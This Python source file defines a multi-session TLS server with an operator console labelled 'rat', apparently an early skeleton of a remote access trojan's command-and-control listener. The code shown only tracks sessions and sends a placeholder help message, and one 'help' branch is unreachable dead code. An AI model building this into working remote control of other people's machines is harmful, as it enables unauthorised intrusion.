import socket
import ssl
import threading
from src.server.utils.config import logger


class TLSServer:
    def __init__(self, host: str, port: int, certfile: str, keyfile: str) -> None:
        self.host = host
        self.port = port
        self.context = self._create_context(certfile, keyfile)

        self.sock = None
        self.running = False

        self.sessions = {}
        self.addresses = {}
        self.next_id = 1
        self.current_session = None
        self.lock = threading.Lock()

    def _create_context(self, certfile, keyfile):
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ctx.minimum_version = ssl.TLSVersion.TLSv1_2
        ctx.load_cert_chain(certfile=certfile, keyfile=keyfile)
        return ctx

    def start(self):
        self.running = True

        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind((self.host, self.port))
        self.sock.listen(5)
        self.sock.settimeout(1.0)

        logger.debug("[+] TLS server listening on %s:%d", self.host, self.port)

        threading.Thread(target=self._accept_loop, daemon=True).start()

        try:
            self._console()
        except KeyboardInterrupt:
            logger.debug("[*] CTRL+C pressed")
        finally:
            self.stop()

    def _accept_loop(self):
        while self.running:
            try:
                client_sock, addr = self.sock.accept()
            except socket.timeout:
                continue
            except OSError:
                break

            threading.Thread(
                target=self._handle_connection,
                args=(client_sock, addr),
                daemon=True
            ).start()

    def _handle_connection(self, client_sock, addr):
        try:
            tls_sock = self.context.wrap_socket(client_sock, server_side=True)
        except ssl.SSLError:
            logger.error("TLS handshake failed from %s", addr)
            return

        with self.lock:
            sid = self.next_id
            self.next_id += 1
            self.sessions[sid] = tls_sock
            self.addresses[sid] = addr
            if self.current_session is None:
                self.current_session = sid

        logger.debug("[+] New session %d from %s", sid, addr)

        try:
            while self.running:
                data = tls_sock.recv(4096)
                if not data:
                    break
                logger.debug("[session %d] %r", sid, data)
        except Exception:
            logger.debug("[-] Session %d connection error", sid)
        finally:
            self._remove_session(sid)

    def _remove_session(self, sid):
        with self.lock:
            sock = self.sessions.pop(sid, None)
            self.addresses.pop(sid, None)
            if self.current_session == sid:
                self.current_session = next(iter(self.sessions), None)

        if sock:
            try:
                sock.close()
            except OSError:
                pass

        logger.debug("[-] Session %d closed", sid)

    def _console(self):
        logger.debug("Admin console ready (type 'help')")

        while self.running:
            prompt = "rat "
            if self.current_session:
                prompt += f"(session {self.current_session})"
            prompt += "> "

            cmd = input(prompt).strip()

            if cmd == "help":
                logger.debug("Commands:")
                logger.debug("  help           -> send help message to client")
                logger.debug("  sessions       -> list sessions")
                logger.debug("  use <id>       -> switch session")
                logger.debug("  exit           -> stop server")

            elif cmd == "sessions":
                with self.lock:
                    if not self.sessions:
                        logger.debug("No active sessions")
                    for sid in self.sessions:
                        mark = "*" if sid == self.current_session else " "
                        logger.debug("%s %d %s", mark, sid, self.addresses[sid])

            elif cmd.startswith("use "):
                try:
                    sid = int(cmd.split()[1])
                    with self.lock:
                        if sid in self.sessions:
                            self.current_session = sid
                            logger.debug("Switched to session %d", sid)
                        else:
                            logger.debug("Invalid session id")
                except ValueError:
                    logger.debug("Usage: use <id>")

            elif cmd == "help":
                self._send_to_current(b"HELP: available commands coming soon\n")

            elif cmd == "exit":
                logger.debug("Exiting admin console")
                return

            else:
                logger.debug("Unknown command")

    def _send_to_current(self, data):
        with self.lock:
            sid = self.current_session
            sock = self.sessions.get(sid)

        if not sock:
            logger.debug("No session selected")
            return

        try:
            sock.sendall(data)
            logger.debug("[*] Sent help message to session %d", sid)
        except OSError:
            self._remove_session(sid)

    def stop(self):
        self.running = False

        if self.sock:
            try:
                self.sock.close()
            except OSError:
                pass

        with self.lock:
            sids = list(self.sessions.keys())

        for sid in sids:
            self._remove_session(sid)

        logger.debug("[*] Server stopped")
